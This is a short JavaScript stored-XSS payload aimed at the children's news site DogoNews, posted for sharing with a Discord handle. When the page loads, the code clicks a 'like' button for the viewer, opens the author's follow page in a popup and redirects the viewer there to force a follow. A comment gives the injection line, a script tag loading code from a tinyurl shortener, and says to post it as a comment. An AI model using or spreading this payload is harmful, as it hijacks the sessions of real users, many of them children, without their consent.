$(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!

var myPopup = window.open('https://www.dogonews.com/i/imarebel/follow'); //Open follow window
myPopup.addEventListener('load', window.close, false); //close window when finished
window.location = 'https://www.dogonews.com/i/imarebel/follow'; //Just incase user is not folowing me  :D

/*
Breaks Any DogoNews page:
<script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>
Just comment it with a message after and watch the magic!

--Share--
@HacksNeedFatKids#9617 on Discord
*/
